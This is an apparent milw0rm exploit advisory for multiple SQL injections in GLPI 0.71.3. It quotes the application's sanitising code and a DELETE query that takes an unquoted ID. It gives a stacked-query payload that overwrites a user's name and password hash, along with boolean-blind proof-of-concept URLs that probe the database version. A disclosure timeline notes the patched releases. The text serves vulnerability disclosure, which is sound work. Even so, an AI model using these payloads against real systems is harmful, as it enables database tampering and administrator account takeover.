@@ -1,0 +1,74 @@
+[+] Application : GLPI v 0.71.3
+[+] App'z URI   : http://glpi-project.org
+[+] Bug         : Multiple Remote SQL Injections
+[+] Author      : Zigma
+
+[+] Home        : http://NullArea.Net
+
+Let's have a look on the Security System GLPI uses :
+
+--- \inc\includes.php ---
+
+// Security system
+if (isset($_POST)){
+	if (!get_magic_quotes_gpc()){
+		$_POST = array_map('addslashes_deep', $_POST);
+	}
+	$_POST = array_map('clean_cross_side_scripting_deep', $_POST);
+}
+if (isset($_GET)){
+	if (!get_magic_quotes_gpc()){
+		$_GET = array_map('addslashes_deep', $_GET);
+	}
+	$_GET = array_map('clean_cross_side_scripting_deep', $_GET);
+}
+
+As you can see , GLPI cleans the POSTS and GETS making it safe from
+cross side scripting and Slahsing it if magic_quotes_gpc OFF ,
+BUT
+We are not obliged to use quotes injecting the GLPI
+We can Inject for example the parameter ID with no need to use a quote
+Taking rulesengine.class.php as an example :
+
+--- \inc\rulesengine.class.php ---
+
+	function cleanDBonPurge($ID){
+		// Delete a rule and all associated criterias and actions
+		global $DB;
+		$sql = "DELETE FROM glpi_rules_actions WHERE FK_rules=".$ID; <--
+		$DB->query($sql);
+		
+		$sql = "DELETE FROM glpi_rules_criterias WHERE FK_rules=".$ID; <--
+		$DB->query($sql);
+	}
+---
+
+Trying to inject...
+since we can modify the ID parameter we will make the query looks like :
+
+DELETE FROM glpi_rules_criterias WHERE FK_rules=1 UPDATE glpi_users
+SET name=1337 AND password_md5=E48E13207341B6BFFB7FB1622282247B where
+ID=1
+and u can guess what u can do..
+
+
+[+] Proof Of Concept :
+
+http://127.0.0.1/glpi/front/user.form.php?ID=2+and+1=1 True , You get
+your normal page
+http://127.0.0.1/glpi/front/user.form.php?ID=2+and+1=1337 False , You
+get "Item not found"
+http://127.0.0.1/glpi/front/user.form.php?ID=2+and+substring(version(),1,1)=5
+, True (in my case)
+http://127.0.0.1/glpi/front/profile.form.php?ID=2+and+1=1337
+
+So other files that uses ID parameter (besides the other parameters)
+Im too lazy to write them all :/
+
+[+] Time Line Notification  :
+
+2009-01-23 - Contacted throw Forum , Bugs Section
+2009-01-24 - GLPI version 0.71.4 Published (Security update)
+2009-01-26 - GLPI version 0.71.5 Published (Fix for 0.71.4 Issues)
+
+# milw0rm.com [2009-01-29]
